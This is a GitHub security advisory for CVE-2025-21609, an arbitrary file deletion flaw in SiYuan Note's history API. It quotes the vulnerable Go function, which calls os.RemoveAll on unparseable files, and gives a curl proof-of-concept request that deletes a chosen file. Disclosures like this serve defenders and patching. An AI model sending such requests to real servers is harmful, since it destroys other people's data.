# [H] SiYuan has an arbitrary file deletion vulnerability

## Summary
Severity: High
Advisory: GHSA-8fx8-pffw-w498
CVE: CVE-2025-21609
CWE: CWE-459, CWE-552
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-01-03
Source: https://github.com/advisories/GHSA-8fx8-pffw-w498
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Summary
A **arbitrary file deletion vulnerability** has been identified in the latest version of Siyuan Note. The vulnerability exists in the `POST /api/history/getDocHistoryContent` endpoint.An attacker can craft a payload to exploit this vulnerability, resulting in the deletion of arbitrary files on the server.

### Details
The vulnerability can be reproduced by sending a crafted request to the `/api/history/getDocHistoryContent` endpoint.

Sending a request  to the `/api/history/getDocHistoryContent` like:

```
curl "http://127.0.0.1:6806/api/history/getDocHistoryContent" -X POST -H "Content-Type: application/json" -d '{"historyPath":"<abs_filepath_of_a_file>"}'
```

Replace `<abs_filepath_of_a_file>` with the absolute file path of the target file you wish to delete.



The `historyPath` parameter in the payload is processed by the `func getDocHistoryContent` in `api/history.go:133`.

In turn, `historyPath` is passed to the `func GetDocHistoryContent`  located in `model/history.go:150` , which is the slink of the vulnerability.

if `historyPath` exists and does not satisfy the `filesys.ParseJSONWithoutFix`, then it will be deleted by `os.RemoveAll`

```go
func GetDocHistoryContent(historyPath, keyword string, highlight bool) (id, rootID, content string, isLargeDoc bool, err error) {
	if !gulu.File.IsExist(historyPath) {
		logging.LogWarnf("doc history [%s] not exist", historyPath)
		return
	}

	data, err := filelock.ReadFile(historyPath)
	if err != nil {
		logging.LogErrorf("read file [%s] failed: %s", historyPath, err)
		return
	}
	isLargeDoc = 1024*1024*1 <= len(data)

	luteEngine := NewLute()
	historyTree, err := filesys.ParseJSONWithoutFix(data, luteEngine.ParseOptions)
	if err != nil {
		logging.LogErrorf("parse tree from file [%s] failed, remove it", historyPath)
		os.RemoveAll(historyPath)
		return
	}
	...
}
```



### PoC
```
curl "http://127.0.0.1:6806/api/history/getDocHistoryContent" -X POST -H "Content-Type: application/json" -d '{"historyPath":"<abs_filepath_of_a_file>"}'
```

### Impact
arbitrary file deletion vulnerability

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-8fx8-pffw-w498
- https://nvd.nist.gov/vuln/detail/CVE-2025-21609
- https://github.com/siyuan-note/siyuan/commit/d9887aeec1b27073bec66299a9a4181dc42969f3
- https://github.com/siyuan-note/siyuan
